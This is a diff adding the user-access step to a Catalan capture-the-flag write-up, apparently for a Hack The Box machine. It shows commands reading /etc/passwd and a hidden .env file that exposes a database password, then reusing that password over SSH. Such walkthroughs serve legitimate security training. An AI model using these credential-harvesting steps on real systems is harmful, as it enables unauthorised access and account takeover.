@@ -141,5 +141,27 @@ Hem aconseguit una reverse shell com l'usuari _www-data_.
 
 ## User
 
+Només hi ha 3 usuaris al host: _root_, _www-data_ i _admin_. Per aconseguir la flag d'usuari, hem de poder convertir-nos en l'usuari admin.
+````bash
+> cat /etc/passwd | grep 'sh$'
 
- 
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/bin/bash
+admin:x:1000:1000::/home/admin:/bin/bash
+````
+En el directori on hi ha allotjada la web hi ha un arxiu ocult .env que té les credencials de la base de dades per l'usuari _admin_. Podem intentar autenticar-nos per SSH (per comoditat, ja que tindrem una consola amb millor experiència d'usuari) utilitzant aquestes credencials, per comprovar si hi ha hagut reutilització de contrasenyes.
+````bash
+> cat .env
+
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+````
+
+I podem veure que sí que n'hi ha hagut.
+
+![image](https://github.com/user-attachments/assets/fdea7bda-92d8-4fb7-87b4-f358cb8392ec)
+
+
+## Privilege escalation
